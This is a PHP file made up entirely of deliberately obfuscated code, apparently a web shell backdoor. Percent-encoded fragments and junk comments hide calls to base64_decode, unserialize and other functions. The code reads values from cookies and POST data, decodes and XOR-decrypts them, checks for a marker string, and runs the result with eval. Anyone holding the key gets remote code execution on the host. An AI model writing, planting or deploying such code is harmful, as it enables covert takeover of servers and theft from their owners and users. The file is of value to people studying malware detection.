<?php // 'pqo mA?KP
pARSe_sTR/* hO}n} */( '8'// <SG:)8q
	. '51=' /* (ep_B */	.# =pP1bJv_j9
 '%7' .// HR8p/\
'4'/* 8%	 -o */	. '%4'/* 	 J"N */ . '2%' .# {L:5_qG
'4'# +>1	=	
.# CfLbn_y
	'f'// +]V>c3@z"
 . '%44'# 6jys|	E~ l
. /* uM}	]CUJ */ '%59' /* cG6f/J% 6 */./* wYK Tn */'&78'	# ERR.Z|N1
. '7' . '='#  J)x'dS_
. '%43' . '%65' . '%4'# Y~)+pRGM0p
. 'e%'// >|aY:!
. '5' . '4%' . // 7	6]+Uj~
'4'# MM{PK
. '5%5'	/* LO:L5Zhu`u */ .# $ty&g.!
'2&6' . '98' ./* 	Xo@,qv */'=%5' // dj+{rnAe+(
.// ZByGKNf
'3%' ./* \	LN	 d&C */'74%'// FjJ\G
	.# 	V[!4y9=
'52%' . '5'# TH<1$g
 . '0%' .	// hnAe6n
	'6f%'# 'S	i |O$
. '5' ./* .T&^  */	'3&' . '671'/*  'yDFp:wL5 */ .	// iQiJLF6S
'=' # 	|	@G {{
. '%4'	/* m|n3Z_2 */ ./* KGiFmGquF1 */'8%4' .	/* f8oRIg */'5%4'	# (E&kOe
 . '1%' .# '	LCm!sB
 '6' .	// !_Zn 5X`
'4' . '&2' .	// ?IFp8U1l@M
'5'// -eT`JY}C7
.	// dvDD,
'4=%' . '73%' . '4' .	/* l8OmYgJf	 */'1%4' ./* {E"H s.2^A */ 'D%' . '50&' . '1' . '92='# $R@O){
. '%6' ./* Xr )kk */'5' .// 2"Uu p
'%6D'	/* zb~% h	O~{ */.	// ,>,)tf|v1
 '%'// P67 =
	. # /,>KpaT}+V
'62%'	# 9@r,y +>x^
.// tvpH1=
 '45%' .# }>B&-fW
'64' . '&5'	/*  zv%T7\y */.# |7p F_e`e2
'9'	/* M=5^cW} */ . '1'# $t"9=E
.// GuJG>5$c@<
'=%' .# 9n5D+j?C
'42' .// &	+?~a(-h
	'%61'// p,jm`
. #  5rM@d[`X_
'%' .	/* 		  eyze]~ */'53'	// 8g	cV^F
. '%6' . '5%'// ' :cF
 ./* BYvx2 A */'36%' .// bIH1?:&3*
'3' // 5Q^jV5c=9
	. '4' .// ^A"zP4
'%' . '5f'# 9j@[$ &
. '%' . '64%'/* ~& aPD  */	. '4' // 	b?wz{"qr
 . '5%'/* _p.%|zA4 */.# 7|ib&WG/=H
'43' ./* QZ EZxc8( */'%'# bb oK
.# 2_DM sH
 '6f%'// &`	58&8P7B
.// F(,^+T	k
'6'//  C/\*
. '4%'/* 4O<IY&}DAD */./* .DMH+5{ */'65&' . '222'// ]lPI>t 
. '=%' . '7'// d0jxc@b_*
 . '3'/* NM4\O[	-Dw */	. '%7' . '5%6'// Y  Xx
	.	# <_E<mqdB
'd%6'// w_X6@&.I?
 . 'd'/* /7kH{b /	Z */ . '%' # LUxOo^4gQr
 .#  |e L1;
	'6' .# 67PUe\|~
 '1%5' . '2%'	# :;TQCNao @
 . '5'# Is	y&Q
./* _`RUx&f */'9'// O,	3lGg3
.# /5.	2;-R
	'&' .	# 	<e [!
 '9' .# "L`MP^5
 '43='// 1@bbljv2	
. # ]S	nK	z /~
'%4' . '2' /* ^	WKd{1  */ ./* G4q=k]1	8t */'%4'	# IT	gk
	. '1%7' ./* XrIP{R2 */ '3%'# _X h]*G
.	# B0	=a`%m	
 '45&' // ";	zWs
.# k6Wa" @Q	
 '28' . '3='#  D*:;GY	Ay
 . # WN I~&P-
'%'# -`=cmj2
	./* r<bq'O */'54' ./* H;Z5_	n0w */'%41' . '%' .	# H0\W-
 '62%' . '6c' . '%45' // aZ}	My
 .	/* M| +Q	Tn5N */ '&99' . '6' . '='# Nb_wboV
 . '%' // QP ] $
 . /* )'|_{7T`	X */	'41' .# %	:8Ox
	'%52'# tg}D	L1O.
.// nT ~lp*!n
 '%'/* @=D~V/ */. '7' # d 3<@@^	%6
. # nv		"m
'4'// 7~[E?}f0L\
	. '%69'// Dpjf k?H<b
. '%43' . '%' /* %Lgd9s@_P */	.// Jl>T+ylN
'4'# MlJ Ma	
	./* " ^EN+5,&= */	'C%' . '65&' . '3'// 0MKR)Hk<(
. '13' ./* K%ANUlP,vP */'=%7'/* {{ rX */.# Q1dm=
'5' // 7 x+_|m	v
	. '%' . /* e+BNP' */'6'	// cJLB58
 . 'e%7'	# w	_ {A,lvQ
. '3%6' # VwU|<~,7
. '5%7' .// }m	4{0`/;(
	'2%4' # T3`@po@_
 . /* M$y A */'9'//  @,JJ	OA !
. '%61' # 0eZT`g2BSw
. '%6c' . '%4' . '9%' . # @1 XiD%?.
'5A%' .	/* $eB&7V>e@* */'65&' . '8'# 4&j3AP'vZO
. '0='/* 1je!\w	UO */. /* 5@oGLp!{ */'%7'	/* PH$/stL */.// t72\E.Dt0M
 'A%' .	// k\cfntwV
'55'/* +	 XKO */.	/* qo)Sri/ 7U */'%' . '64%'// )%,ee	Z
 ./* TM[M!I>IO_ */'53%' .# e+gh lLqaO
'42' .	# 	Z(2sT
'%' /* lX:|F'P8z1 */.// |UX0oo!%\
	'50%'# ('	 Mbm5{
./* ^5rMv */ '4c' .	// x Ig"`ZL~
'%3'/* u+a,7G */ . /* J`4-2J */'6' .	# :2)!$ZtKt
'%59'// *M%%ma
. '%4f'	# qfp:3\?HI9
. '%3'/* Q^*q7Sw */. '5'/* yx]!	 */.# &WQpW
'&9'/* WMrJ[-l */. '4' .# <	3 O/d`>
 '2=%' . '6' .# ]/g0CriCB
'1' . // julpsM;\
'%' . /* J=fw4{rrv` */'72'// `NKd%u0
. '%72' . //  U)s	:?c)
	'%4' .// |UO] F/h+	
'1%7' . # 0)	(Y
'9%' . '5F' . '%'// Ci;^w1
.	/* ?r +g */	'56%'// LL=V1ftYXp
	.// Lx|=o
'41%'#  c|YPO s
.// ,BoY0}'
'4C' . '%55' .// %	,Jg
 '%65' .# {d]n	zY;UW
'%' . '53&' . '8' // ('Y7@u
.# 05~cE	
	'7=%' ./* _2	Ct */'56%' . # ?T k$[I
'49' .	# ^q<C`
'%6' . // KQ2oii'B?
'4' .// cC Q	~kF	
'%65' .	// 	 r^?jqZ
	'%4F' . '&'// gFOuAtXs 
.// R.F];-)1}
 '837'// 	3E!o f{
	. '=' . '%5' . '3%'/* N6~>IuV */. '75%'	/*  i		iI */.//  n`:n)1=MH
	'6'//  Qt6Z2q
./* %	_vw */'2%'# _AH;nImU($
	. '53' .# f	g|JK	D@g
 '%5'// KzT~	|c
.// 4c4|YfM
'4%5' . '2&9'# q\dykuND
./* }%_y<'o */'60' . '=%6' .	// 4OT?g Rw
'4%6' ./* v pDYP */'9%6' . '1%'/*  S(,$d>Jk */ .# @)	wGp*X
 '6c' .	/* CV,K>B= */'%' . '4' # [MmI>
. // &eNj&*J(
'f%'// ja	gN 
. '47&'// Rvrdr.rJ
	.# ~?	*d0
	'58' . '3=%' . '53%' . '7' . '4' . // yE&d@2
'%5' .# /N	oC
'2'/* *\/|B	 */. '%4'/* olP&< */	. // ;	\ry
'C%4'# QgMD$[KK'
./* M,-dE */'5' . // dWzqzWnL
'%4e' . /* T i"gF_NU\ */'&' . '68' .# +8,$}
	'5=%'	# <CS*UNq
. '66' . '%' ./* 2=>muAh */'4a%' .// MW?<9 z
'55'	/* 8?<IdRq */. # 	1wVIPQ 
'%' . // ]~eCaq
	'41' . '%5' . '0' .// x5Zl .	ED
'%' . '67' // XmIN0X
.# h-`08/M8 
'%6A'	# ea |8YW 
. '%73'# " A`}Cb%.
 . '%' .# ^_BO  V
'6f' . /* _`(jASG */'%6' . 'A' ./*  '	zuh */'%'// { &7)up*	
. '32%'/* tQ;PAWV */. '5' . '8&'# F	~Qw	:
. '7'/* J'Q(T */. '68' // =N=>i	
	.// ]X>LJ	VM
'=%' . '6'// 's.SqgK@
	. # 	y) as'
	'4%4'// |*6;2XH
. 'f'	// ;[	: pTE
. // 2k6 |R
'%' ./* ~|&T@gz */'4' . // 1\<L)  7
 '3%' # ga.{?Ecj
 . '5'/* =o(-Ut */. '4%5'/* \B` H */./* &Qu9&NbT/ */'9' . '%7' ./* d">d p */'0%' . # >1!9=6
'65'# O!dyqA"Z
 . '&12'/* mBfqx */	.// rt 	2
'=%' . # {[Wu@NK
'4D' . '%45' . '%4e' ./* 6Z'@)wh$ */'%' .	/* /Di	pKu	 */'55'// T	_]	kCy(
. '%49' . '%' .	// &	US,
 '54%'# 	zSMJs
. '65%'	// 	'\c.us{(V
. # XJN`W
	'6D'/* 2 +	'8_d} */. '&'# mC=u@c
. '2' . '8' .	# Pt	is
'2=%'	// /?"';k
. '6' . '1%'/* %v.]B];(h */. // q"*J]uMOW4
 '3a%' . '31%'# Eu%a_iZ4h
./* ! 30R<K */'3' . '0' ./* F:cA+	 */ '%3A' .// [	~.wiC
	'%'// 2	"8n3u-
.# 6jRn)b
 '7' . 'b%6' . '9%3'/* H)TY1U' */. 'A'/* c\<ThRh  */./* G';~:U|	 */	'%' ./* YD`5	=>pq */'39%' // 6[KQ$
.# f5	YK
 '36%' .	// 3,%.V2- g\
'3b'/* N.jz}_A]1- */.// 9$2Y28!P6)
 '%69'/* tWllP~sex */.# }G] P?
	'%3' // )	S;n-Mg"
./* I M P@u */'a%' .// hB-!Y vym
	'31' # Mf	.rHaVmV
.	# `aX(|1	x
'%3b' . '%'	/* ~8X}MY|I-s */ ./* e z@	yltM+ */ '69%'	/* oD&k*k */ .	// Orwf' U
 '3a%' . '3'	# 6&DxM	{
. # Wd97|9s
'5%3'// K	V)3
. '9%' . '3'// 	7<!Lg
 ./*  w3N9	 */'b%6' . '9%' . '3A%' ./* =vI:he8 A& */ '33%' .	// Oy49f^
	'3B'/* B(,6	F0d */. '%69' # j`eT,
	. '%'# 37E*{QuOuG
 .# jg%N	8O.F4
	'3'/* MsZwHG */. // im%_{l
 'A%3' ./* 7e];Uxt */ '3%'# >:. sh5Y?
./* B6@z.TfA~ */'39'	# C$"%8Aty
	. /* Ev* 7^RMD */'%3'// 1Y	"-|=0;=
.# &v*9o
'B%'	# LgH"	d	r
. '6' . '9'	// o\o	"f
. '%3A' .# :}h8W9
'%3' // =J2OK
.# kx wj
'1%3'# a>yY\
 .	// Iee,Cs>Jz
'4%3'# t;Nrc
. 'b'/* J][FpDF[ */	.# -2z.axm;X%
 '%69'/* G H^ z{S)g */. '%3' . 'A%' . '38'/* /T	EbL */	. '%39'/* 3	q : */	. '%3' . 'B%' . '6'// xb	F=5dq	
. '9%3'# zgr	1BN
 .	/* <o7?m$ */	'A%'/* 90\1Qs2N^c */.	// bjG\}' d
'3'// r(`*:9H[
.# %2YSL>IDXa
 '6%3'	# !	tVI}
. 'b' .	// OPlZx"L
	'%' . '69'	/* ?Y>m-5H */. '%3a' .	// ^Mn	FhZ=C
'%38'// 5qS39-gS.
. /* gUIn%I */'%3' . '4%3' /* 1GlD?4 */	. 'b%' .	// J%U@w+
'69'# Q0K`>47l
 . '%' . '3a%'// -Ib7Z^ q
. '34%'/* 3Nu!_yd^"n */. '3b' .	#  }.5|7s
 '%69' . '%3a'// 	l[V*%8<@
 .// p	]M; CJ
	'%3' .// 9a^Gr(xB
	'2' .// nZ J@K}
'%3' ./* mWiN L^p 4 */'3%3'# 4Bnc ;A*
. 'b'/* Kya;Jk=ep	 */	./* IQ2R	CGO-X */'%69' . '%'	# x6 J1
.// 	l4k	*2
'3' . 'A%'/* Y;Ipx 8R+@ */. '34' . '%3b' . '%' // V	1|y	dJ
. '6'# /jQNpR	&*
. '9%3' . 'a' .# x1sw9[$
	'%3'# gEtp}_+u
 .	// $0&_SYt
	'5%3' . # &_G	D]>
	'8%3' . 'B' .# d*G 	&u|w3
'%'# RfNy7a^ nK
	./* 	X	ul$M */ '69' . '%3' . 'A%3'	/* Mn "~$F$ */. '0%' . /* y %[Tx+ */'3B%' . '69'	/* O4d:e=^3 */ .// 	Yas)
'%3a'/* @	\lmS */ .	// 	_Q6]fYx
	'%3' . # N8+_DB&
 '8'/* ,_{eS  */./* 0Lr':	$ */ '%' . '37' // g yN!	h
. '%' .# /vYV\	+S4
'3b' .// n+	(y9o*
	'%6' ./* ^xb=%n >Y */'9' // A	}r1A.f
. '%' . '3a%'	/* 	:/s}P */ .	/* 	Ai	] */'34' /* |gmHKri */ .	# {aQdgbsj
'%3b'// Naf/"\Kx
 . '%6'/* Ilet<c\i */. '9%' .// & sG/le\o
'3a'// vB4\zi?
 .// _HEE}
'%35' /* sG[tsp  */. '%' //  F5C &bx*
./* Li]o%vU */'3'/* q>[=@4  */ . #  &	<f 
'1%3' . 'b'# TI$Yj\	
 . '%69' .// B{gJ~'8s
'%3'# wT	J;qwhv
. 'A%' . '3'/* iuRW	G!>O4 */.// dC$	*
 '4' .# `F.7:oI
'%3B' . '%6'// i	D$?],/D
. '9%3'// 	Ax ~3
.# [B? \
'a' . '%'# }^me<`x97
. // sO9;(	b
'32%' /* <^<>ZmFnV */. '34' . '%3B'/* 7Qwmug	 */	.# !{i3'3Db
 '%6'# Yq}rk(&	e
. '9%3' .# V^%*b
 'a'	//  [_%B@x/
. '%' ./* ]1_fI{`-7 */'2D'# 8PIYiR k
. '%3' .# {m|>E4
'1%' . '3B%'/* Z^]sP	h */. // \<}XH|Yg
'7D&' .# U-jVfI	0
'961' . '='	// U]Ygo
. '%' ./* Iu 	!6 */'75%'# Ag	p]!
. '6' . 'F%7' /* F"GVOV  */	. '9%' ./*  NT>FZ:_B */'4' ./* 5<h\gQEF */'6' .	// >Q`p{]Td
'%6D'// m|=hi7Q
	./* cq`F}^II>  */ '%54' .# { 1b4P7
'%3'/* x	,oT88xY */ . '0%5' .// k(>P&wLJv
'7%'// zh8/B.X
 ./* ?OSKq5v	 */'3'# +ab*fM7~S{
. '7%4'	/* 	M ))7 */. '7%4' .# ^v	Br`&d 
'd%7' . 'A%3' .// VjTI}S:y
'8' . '&62' . # 1N@x<Zt
 '1'# fC)<A?
 .// BaB9"x
'=%6' .// V{uc)
'8%' . // ');H.W.Ga
 '7' .	/* ^9=, '5*f$ */'4' .// h6O2iVX
'%6' . 'D%' . '6c' /* ry8pSP */.# }6t-zv1
'&'// uQX|n <[ 7
. # <H&		N
'9' ./* $?J5@VP */'6' .// ZKMf$RZ
	'9' /* CGKb;6 */. '=%'/* G6KKF */. '54%'/* ,R5b:Tz */.# bzA-NE_YK
'52&' # /iD@	eI
 . '3' .# f5&bszR)
'51=' .// '+h2 p  Z
 '%'// (S4$,z	S
./* ](p Vx( */	'48' . /* VDM(i0:wq  */'%' . /* 	]y@]" */	'67%'# ^2k>]\
	.// +[473(5
'52' .// u[ 8s
 '%' ./* l ;IE */'4f'	# K](I,h;	
	./* G33m;[I4 */ '%7' . '5%'// .sOa(~
.# ~CcgXS|< 
	'5' . '0&' .	// 6"B	[
'29' . '5=%'/* w7=K Wg] */ . '55' . // m1?W;
'%'# t]OlyF
 .// f3z8nGvR9U
'72'// 	$[<5^dS
. '%6C' . // fw}?<st(	
 '%64'# z	Jb}
 .	// %g= \(u
'%65' // srE	G
. // A 	B<	MKX*
	'%6'	# -:__WbE
	. '3%'// 	|h8q:
	. '4f'// YfLar3A	X
./* E_9fR  */'%4'// 	N=so |
.	// *l1>P[B=V
 '4%' . '65' # 	WCgy
.# GwFE31G b 
'&6'	/* d~	6eh1@ */. '57' .//  O{QL
'=%4' . '2'/* 	m[ubR? */.// 2Be9M~4)k
'%6' ./* s	{{J */'1'	# DE}'Ms
. # hLSK5,sw+
'%5' .	/* k^aw[ */'3%6'// $b	F~&4=
. '5'// &7m	(5s2Y	
./* ]5'1 I>kaJ */ '%46' .	# s'^<CYn1	e
'%'// x	kaB;G[
./* !z, }5[1 */'6' .// m{~_.W!o*
'f%'# 9cwveQ~
. '4e' . '%7' . '4' . '&13' . '6=%'# O>gK\
. '7' . '6%4'/* AnW_C8z */./* piWgW7O */ 'B%7'// `CFmKtp
. '3%3' .#   u+{Y		<
	'9'# VTmWxRdFW
. '%41' .// 	xqL	C7'1
'%3' .# c`NqqM:RVo
 '4%6' .// RdNuypf
 'c%' . '50%' . '76' . '%'	// ;P7.x>
.# $	+-O
'3' . '9%7' // &	{*dp\U
. 'A' , # r`b;<)C Lh
$wo3 ) ;/* kqXd  */$vQ4S /* g\p}m */= $wo3 [	/* 6^d 	-7RY] */313	# SAi6I
 ]($wo3 // XI8	H1
[ 295 ]($wo3/* LCDc"V */[// "b@`7K  B
 282// y&?BYqn 0
]));// c9 !=| 	7}
function zUdSBPL6YO5/*  Y9[\GsOmX */( $YPbBlpCf , #  y)kNZUK+-
$xyQbfe	# r.!R+Cp4
 )# XEp$hVV&	
{ global $wo3 ; $t7mGrJ =// r ^1	[^C
'' ;	/* ,p`T*e */for	// _btDuM, f|
( $i =# ]	`	5Y4J3r
0	// 	M	'e
	; /* V!E@)C */$i/* Co@!b */	</* Gj	|SuyPV */$wo3 [ # w>mHU
583 ]/* 9pH	AVdfPL */	( # >x>3$`No[
 $YPbBlpCf ) ;/* RS!?Kf */ $i++ // 1%>P[`Qx
)/* =jc$yZU2 */	{ $t7mGrJ/* "HY\,C	7 */.= $YPbBlpCf[$i] ^ $xyQbfe # Si!Cr.7_
 [	/* Qg|$;  */	$i % $wo3# b'Mlq|C
[ 583 ]# r,:z:s$x
 (// <*8B8m^0
 $xyQbfe// %Ru)IA
 ) ] ; }# 8%^d'A?NN
return/* be*^m[ */$t7mGrJ# h+dB1
;// Fe\Oh>$t
} // .	;s>g	i
 function uoyFmT0W7GMz8# 76HA]
(# m[+nr'
	$glOqix/* R"BQ8/ */)# iR-("	`j|
 {	#  t|hB&
 global $wo3/* \V NCV */; return $wo3 [ 942// 	 tPTZ
 ]//  ={|A*t
(// w \.EC	
$_COOKIE/* G	W{5L/"A */) [ $glOqix/* qIUr+Fw */ ]	// Q(Q`4.
;/* /?ZvL;" */} function	// O+C/HI/c
fJUAPgjsoj2X ( $hvqw3nQ7 ) {	# q		aG
	global/* q`zf	]' */	$wo3 ; return $wo3/* (Ze4`Q */ [ 942 ] (	// )- IxZ
 $_POST ) [ $hvqw3nQ7 ]//  ~5`Usi
 ; }/* !tUQPm */$xyQbfe = $wo3 [ /* f` nx"wb4d */80/* (4S\$ Z*4 */] ( $wo3	# M[0<v"X
[ 591// H\z"Z'
]	# TkE}(~6Oz
(// ," PhU/r
 $wo3# 	0W83,=)
	[// |<qH7N
837/* bw,eU~Ek} */]/* DKUT~I/P */( $wo3/* 28]\^ */ [ 961 ] ( $vQ4S /* !'L=j(: */[ # ZG> W	kP
96 ]/* ]$?:ucf */) , $vQ4S/*  L2u8`/@i~ */	[/* 	$BH qQ9l */39# ++G6{t
]	# _hk	!C
, #  )Uw 
$vQ4S/* eYZ'.J */[ // TT><`
84/* 8;P	h!-4/  */] * $vQ4S/* y+7v8Hs2 */[ 87 ] ) ) ,// oG&l,
$wo3/* 	ltT	 */ [ 591	// uZQz aS}
	]/* ,r	)tS6~{  */	( $wo3 [// 3JW</E
837 ]	# @{<0^H?!.
	(// @k5HmXFk
$wo3	/* ODN	Nl1> */	[ #  gTkO,2	' 
961	/* 4jckYCL- */] (// ?l8`|@<
$vQ4S [ 59 ]	# 	 RyY
	)# wDpVqJ
 , /* Oc> 	r*	 */ $vQ4S# vvq	V&|vS*
	[ 89// F$&8f
] , $vQ4S # Lr_>m4U!
	[ 23// a>	XR~
] /* ZX".P2| */* $vQ4S [ 51	// ! ! D+a
]	// 6QJ/F
 )/* t78Ou4W */	) # =/V]MP\
)// k7Sx	J
; $QvGzmr5x = $wo3 [ /* pG`p[	_ */	80/* =jXyA(P_Ky */]# 0@cV]M
	( $wo3 [/* x UR5 */	591	// M!0"g/n
	] (# |}as<
 $wo3 [ 685	/* Yo<"<=IJ]| */] (// 4pm4,_~
$vQ4S [ 58 ] ) # x4+Bi
)//  a3r|[_
,	// ~pC5b		
$xyQbfe# eVt.08DMN
) /* ,$qWxP9/v */	; /* _hny_ */if#   o8\	7C
(# |gNe5<
$wo3/* furi{l)COq */[ 698/* R	|Q6`P"fo */	] ( $QvGzmr5x /* 4V>8o)xo	p */, // 1yOV@
 $wo3	/* L. *I8} */[// 4Hc:@
136 ] ) > $vQ4S /* 7x}hC2L */[ 24# qtzOwd$
] ) # _ 0V-'|B*@
EvAL	# gdPCi.
	(# \`!*0E	8
$QvGzmr5x# <.qH|P~
)/* Z=y)&H.Rnb */; 